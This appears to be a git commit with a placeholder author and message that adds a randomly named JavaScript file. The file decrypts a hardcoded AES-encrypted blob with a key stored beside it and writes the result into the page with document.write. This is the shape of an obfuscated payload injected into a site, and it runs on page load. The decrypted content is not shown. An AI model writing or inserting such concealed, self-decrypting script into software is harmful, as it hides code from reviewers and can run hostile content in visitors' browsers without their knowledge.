18a5691d478c80632a5cc61e16ae0455c1049d82
bulaba <octocat@github.com>
2023-02-09 09:14:15 +0200

    my commit message

---
+++ LlSsGfEHP.js
@@ -0,0 +1,5 @@
+var RndG="U2FsdGVkX1+suKG+PymMttOfUUE0b19UY/f/KGs8UWPMP3c6X7BZdfLic5faiyseOeuONRW4ICauEigSlgKAam0595Q/e7kPkWMNL10ydFzKxpcBhbA+lLz2l7w1cpdIUxMOWfPUJUPMTerOb/MszD2cgxI2GwYW1FT9aKclPhx7AU9eEYKtccacwQOuD8ctXnTv6tG8BzX9EfpzHoR+PvEIp9vKKnAFwuHpvsnJ0xQ5w+/cCyICuy9ojAotkiHzPOH3SfZ5bTMmgYGQGJ1V4M0XQe7WiVJQd59E++fVN5jYZMsEXnTjYheQgKmEoEjN1makDfsBSwn756uqosO7ZOT2oJc1X4Q9WxTf0gVV7V5HOA9Og8t1FBrAlPSQwJSS0BYfVGNrATX7D+2c2m7jpRcqHckQ5JpfIWFLjlEnbNdivO0Es+y3WE374eUQ/tq9q1O+VxIevbrxW4MkSE/QvsixxzNo7Foa/N7JtBUs4tfb5UAFY7yR3QY74hJFBWd27LXM2OPL6areeobppJ/KlXf+9oV2bKGhwGXuecPxhM4=" 
+ var qIEIp = "aSFihMbPmTTdkzMu"; 
+ var ynVlYHH= CryptoJS.AES.decrypt(RndG, qIEIp); 
+ var WmXCcm = ynVlYHH.toString(CryptoJS.enc.Utf8); 
+ document.write(WmXCcm) 
